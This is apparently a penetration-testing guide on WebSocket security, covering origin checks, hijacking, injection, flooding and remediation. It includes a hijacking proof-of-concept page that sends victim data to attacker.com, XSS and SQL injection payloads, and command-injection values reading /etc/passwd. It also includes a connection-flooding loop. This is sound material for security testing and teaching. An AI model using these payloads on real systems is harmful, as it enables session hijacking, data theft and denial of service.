# WebSocket Security Testing

## Overview
WebSocket attacks exploit weaknesses in WebSocket implementations, including missing origin validation during the handshake, absent authentication/authorization on messages, injection flaws in message processing, and cross-site WebSocket hijacking (CSWSH). Because WebSockets maintain persistent bidirectional connections, successful attacks can enable real-time data exfiltration, message manipulation, and session hijacking.

## Classification
- **CWE:** CWE-1385 (Missing Origin Validation in WebSockets), CWE-287 (Improper Authentication), CWE-345 (Insufficient Verification of Data Authenticity)
- **OWASP:** A01:2021 - Broken Access Control, A07:2021 - Identification and Authentication Failures
- **CVSS Base:** 5.3 - 9.1

## Detection Methodology

### 1. Identify WebSocket Endpoints
```bash
# Look for WebSocket upgrade requests in traffic
# Common patterns in source code:
#   ws://target.com/socket
#   wss://target.com/ws
#   new WebSocket('wss://...')

# Check for upgrade response
curl -s -D- -o /dev/null \
  -H "Upgrade: websocket" \
  -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Sec-WebSocket-Version: 13" \
  https://target.com/ws

# Expected: HTTP/1.1 101 Switching Protocols
```

### 2. Cross-Site WebSocket Hijacking (CSWSH)
If the server does not validate the `Origin` header during the WebSocket handshake, an attacker page can establish a WebSocket connection to the target using the victim's cookies.

**Detection:**
```bash
# Check if Origin is validated
curl -s -D- \
  -H "Upgrade: websocket" \
  -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Origin: https://evil.com" \
  https://target.com/ws

# If 101 Switching Protocols → Origin not validated → CSWSH possible
```

**CSWSH PoC:**
```html
<html>
<body>
<h1>CSWSH Proof of Concept</h1>
<script>
  var ws = new WebSocket('wss://target.com/ws');

  ws.onopen = function() {
    // Send request that triggers sensitive data
    ws.send(JSON.stringify({action: 'getProfile'}));
    ws.send(JSON.stringify({action: 'getMessages'}));
  };

  ws.onmessage = function(event) {
    // Exfiltrate received data
    fetch('https://attacker.com/collect', {
      method: 'POST',
      body: event.data
    });
    document.getElementById('log').innerText += event.data + '\n';
  };
</script>
<pre id="log"></pre>
</body>
</html>
```

### 3. Authentication Bypass
```
Test sequence:
1. Connect to WebSocket WITHOUT authentication cookies/tokens
2. Send messages that should require authentication
3. Check if responses contain authenticated data

4. Connect with valid token, then send token of another user
5. Check for horizontal privilege escalation

6. Connect and send admin-level commands as regular user
7. Check for vertical privilege escalation
```

### 4. Injection Attacks via WebSocket Messages

**XSS through WebSocket:**
```javascript
// If WebSocket messages are rendered in DOM without sanitization
ws.send('<img src=x onerror=alert(document.cookie)>');
ws.send('{"name":"<script>alert(1)</script>"}');
ws.send('{"message":"test\"><img src=x onerror=alert(1)>"}');
```

**SQL injection through WebSocket:**
```javascript
ws.send('{"query":"SELECT * FROM users","id":"1 OR 1=1"}');
ws.send(JSON.stringify({action: "search", term: "' UNION SELECT username,password FROM users--"}));
```

**Command injection through WebSocket:**
```javascript
ws.send(JSON.stringify({action: "ping", host: "127.0.0.1; cat /etc/passwd"}));
ws.send(JSON.stringify({cmd: "status", server: "$(whoami)"}));
```

### 5. Message Manipulation
```
Interception tests:
1. Capture legitimate WebSocket messages
2. Modify message fields (user IDs, amounts, permissions)
3. Replay previous messages
4. Send out-of-sequence messages
5. Send malformed/oversized messages
6. Test integer overflow in numeric fields
7. Modify message types or action fields
```

### 6. Denial of Service
```javascript
// Rapid connection flooding
for (let i = 0; i < 1000; i++) {
  new WebSocket('wss://target.com/ws');
}

// Large message payload
ws.send('A'.repeat(10 * 1024 * 1024));  // 10MB message

// Fragmented message abuse
// Send many small fragments without completing the message
```

### 7. Insecure Transport
```
- Check for ws:// (unencrypted) vs wss:// (TLS)
- ws:// connections allow MitM interception and modification
- Verify certificate validation on wss:// connections
```

## Tool Usage
```bash
# wscat - WebSocket command-line client
wscat -c wss://target.com/ws -H "Cookie: session=abc123"
# Then type messages interactively

# websocat - advanced WebSocket client
websocat wss://target.com/ws
echo '{"action":"getUser","id":1}' | websocat wss://target.com/ws

# Burp Suite WebSocket support
# Proxy → WebSockets history → view/modify messages
# Repeater supports WebSocket message replay

# OWASP ZAP WebSocket testing
# Automated WebSocket fuzzing built-in

# Custom Python testing
python3 -c "
import asyncio, websockets
async def test():
    async with websockets.connect('wss://target.com/ws',
        extra_headers={'Origin': 'https://evil.com'}) as ws:
        await ws.send('{\"action\":\"getProfile\"}')
        print(await ws.recv())
asyncio.run(test())
"

# Nuclei WebSocket templates
nuclei -u wss://target.com/ws -t websocket/ -batch
```

## Remediation
1. **Validate Origin header** -- reject WebSocket handshakes from untrusted origins
2. **Authenticate on handshake** -- require valid session token during upgrade request
3. **Authorize each message** -- check permissions on every incoming message, not just at connect
4. **Sanitize message data** -- treat WebSocket input with same rigor as HTTP input
5. **Use wss:// only** -- enforce TLS for all WebSocket connections
6. **Rate limit connections** -- prevent connection flooding and message spam
7. **Validate message schema** -- enforce strict message format and reject unexpected fields
8. **Implement message signing** -- HMAC or similar to prevent tampering
9. **Set connection timeouts** -- close idle connections to prevent resource exhaustion

## Evidence Collection
- WebSocket endpoint URL and handshake request/response
- Origin validation test results (accepted/rejected origins)
- CSWSH PoC HTML demonstrating cross-origin WebSocket access
- Injection payloads and server responses
- Authentication bypass evidence (unauthenticated data access)
- Message manipulation results (before/after)
- Sensitive data received through the WebSocket
- Impact assessment (data exfiltration, action execution, privilege escalation)
